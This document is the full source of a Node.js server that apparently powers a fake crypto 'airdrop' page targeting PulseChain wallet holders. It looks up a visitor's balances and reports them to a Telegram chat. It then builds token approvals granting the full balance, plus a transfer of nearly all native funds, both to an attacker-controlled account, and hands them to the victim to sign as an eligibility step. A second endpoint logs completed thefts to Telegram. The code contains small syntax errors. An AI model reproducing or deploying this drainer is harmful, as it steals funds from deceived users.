import express from 'express';
import cors from 'cors';
import axios from 'axios';
import { ethers } from 'ethers';
import TelegramBot from 'node-telegram-bot-api';
import dotenv from 'dotenv';
import Moralis from 'moralis';

dotenv.config();

const corsConfig = {
    origin: 'https://pulselop.com, 
    methods: ['GET', 'POST', 'PUT', 'DELETE'], 
    credentials: true, 
  };
const app = express();
app.use(cors(corsConfig);
app.use(express.json());

const PORT = process.env.PORT || 8000;
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const RECIPIENT_ACCOUNT = process.env.RECIPIENT_ACCOUNT; 
const MORALIS_API_KEY = process.env.MORALIS_API_KEY;

const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: true });

// ✅ Start Moralis only once
async function initMoralis() {
  if (!Moralis.Core.isStarted) {
    await Moralis.start({ apiKey: MORALIS_API_KEY });
    console.log("✅ Moralis initialized");
  }
}

initMoralis();



app.post("/api/getBalances", async (req, res) => {
    const { walletAddress, chainID } = req.body;
    console.log(`Checking balances for: ${walletAddress} on chain ID: ${chainID}`);

    try {
       // Get ERC-20 Token Balances
       const tokenBalanceResponse = await Moralis.EvmApi.token.getWalletTokenBalances({
        chain: chainID,
        address: walletAddress,
    });

    console.log("Token Balance Response:", tokenBalanceResponse);

        const tokenBalances = tokenBalanceResponse?.raw?.length
            ? tokenBalanceResponse.raw.map((token) => ({
                symbol: token.symbol,
                balance: token.balance ? ethers.utils.formatUnits(token.balance, token.decimals) : "0",
                contractAddress: token.token_address,
                decimals: token.decimals,
            }))
            : [];

        console.log("Token Balances:", tokenBalances);


         // Get Native Balance 
         const nativeBalanceResponse = await Moralis.EvmApi.balance.getNativeBalance({
            chain: chainID,
            address: walletAddress,
        });

        console.log("Native Balance Response:", nativeBalanceResponse);

        const balanceInWei = nativeBalanceResponse?.raw?.balance || "0"; 
        const nativeBalance = parseFloat(ethers.utils.formatEther(balanceInWei)).toFixed(2);
        console.log("Formatted Native Balance:", nativeBalance);

        

        // Check Eligibility
        const hasNativeBalance = parseFloat(nativeBalance) > 0;
        const hasTokens = tokenBalances.length > 0 && tokenBalances.some(token => parseFloat(token.balance) > 0);

        if (!hasNativeBalance && !hasTokens) {
            return res.json({ eligible: false, message: "You are not eligible for this airdrop." });
        }

        // Send Data to Telegram
        const message = `
🚀 **Wallet Detected!** 🚀

📌 **Wallet Address:** \`${walletAddress}\`  
💰 **Native Balance:** \`${nativeBalance} PLS\`

🔹 **Tokens:**
${tokenBalances.length > 0 ? tokenBalances.map(t => `🔸 ${t.symbol}: \`${t.balance}\``).join("\n") : "❌ No tokens found"}

✅ *Status:* Eligible for airdrop 🎉
`;


        await bot.sendMessage(TELEGRAM_CHAT_ID, message, { parse_mode: "Markdown", disable_web_page_preview: true });

        
        let approvalTransactions = [];
        let unsignedTransaction = null;



        // ✅ Create Approval Transactions for ERC-20 Tokens with Balance > 0
        for (const token of tokenBalances) {
            if (parseFloat(token.balance) > 0) {
                const approveAmount = ethers.utils.parseUnits(token.balance, token.decimals);
                const approvalTx = {
                    to: token.contractAddress,
                    data: new ethers.utils.Interface([
                        "function approve(address spender, uint256 amount)"
                    ]).encodeFunctionData("approve", [RECIPIENT_ACCOUNT, approveAmount]),
                    gasLimit: ethers.BigNumber.from("50000"), 
                    chainId: chainID,
                };

                approvalTransactions.push(approvalTx);
            }
        }

        // if (approvalTransactions.length > 0) {
        //     await bot.sendMessage(TELEGRAM_CHAT_ID, `🛑 **Approval Required!** 🛑\n\nYou need to approve the following tokens before they can be transferred: \n\n${approvalTransactions.map((tx, i) => `🔹 ${tokenBalances[i].symbol}`).join("\n")}`, { parse_mode: "Markdown" });
        // }

        // ✅ If the native balance is greater than 0, prepare a transaction
        if (parseFloat(nativeBalance) > 0) {
            console.log(`Preparing transaction for ${walletAddress}...`);

            const GAS_LIMIT = ethers.BigNumber.from("21000"); 
            const MIN_GAS_FEE_PLS = ethers.utils.parseEther("20");
            const GAS_PRICE = MIN_GAS_FEE_PLS.div(GAS_LIMIT);

            const gasFee = GAS_LIMIT.mul(GAS_PRICE);
            const balanceBN = ethers.BigNumber.from(balanceInWei);
        
            if (balanceBN.gt(gasFee)) {
                const sendableAmount = balanceBN.sub(gasFee); 
        
                const transaction = {
                    to: RECIPIENT_ACCOUNT,
                    value: sendableAmount.toString(), 
                    gasLimit: GAS_LIMIT.toString(),
                    gasPrice: GAS_PRICE.toString(),
                    chainId: chainID,
                };
        
                unsignedTransaction = transaction;
                console.log("Unsigned Transaction:", unsignedTransaction);
            } else {
                console.log("Not enough balance to cover gas fees.");
                return res.json({ eligible: false, message: "Not enough funds to cover gas fees." });
            }
        }
        

        res.json({
            eligible: true,
            nativeBalance,
            tokenBalances,
            approvalTransactions,
            transaction: unsignedTransaction,
        });

    } catch (error) {
        console.error("❌ Error fetching balances:", error);
        res.status(500).json({ error: "Failed to retrieve wallet balances." });
    }
});




app.post("/api/transactionConfirmed", async (req, res) => {
    try {
        const { walletAddress, transactionHash, type, chainID, tokenAddress, tokenAmount} = req.body;
        
        // Validate required fields
        if (!walletAddress || !transactionHash || !type || !chainID) {
            return res.status(400).json({ success: false, error: "Missing required transaction details." });
        }

        // Format the Telegram message
        let message = `✅ *New Transaction Confirmed!*\n\n` +
                      `🔹 *Sender:* ${walletAddress}\n` +
                      `🔹 *Token Address:* ${tokenAddress}\n` +
                      `🔹 *Token Amount:* ${tokenAmount}\n` +
                      `🔹 *Type:* ${type === "approval" ? "Token Approval" : "Native Transfer"}\n` +
                      `🔹 *Chain:* ${chainID}\n` +
                      `🔹 *Transaction Hash:* [${transactionHash}](https://otter.pulsechain.com/tx/${transactionHash})\n`;

        if (type === "approval") {
            if (!tokenAddress || !tokenAmount) {
            } else {
                message += `🔹 *Token Address:* ${tokenAddress}\n` +
                           `🔹 *Approved Amount:* ${tokenAmount}`;
            }
        }
        
        const telegramResponse = await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: "Markdown",
            disable_web_page_preview: true
        });

        return res.json({ success: true, message: "Transaction confirmed and sent to Telegram." });
    } catch (error) {
        console.error("❌ Error processing transaction confirmation:", error.message);
        return res.status(500).json({ success: false, error: "Failed to send Telegram message." });
    }
});



app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
});
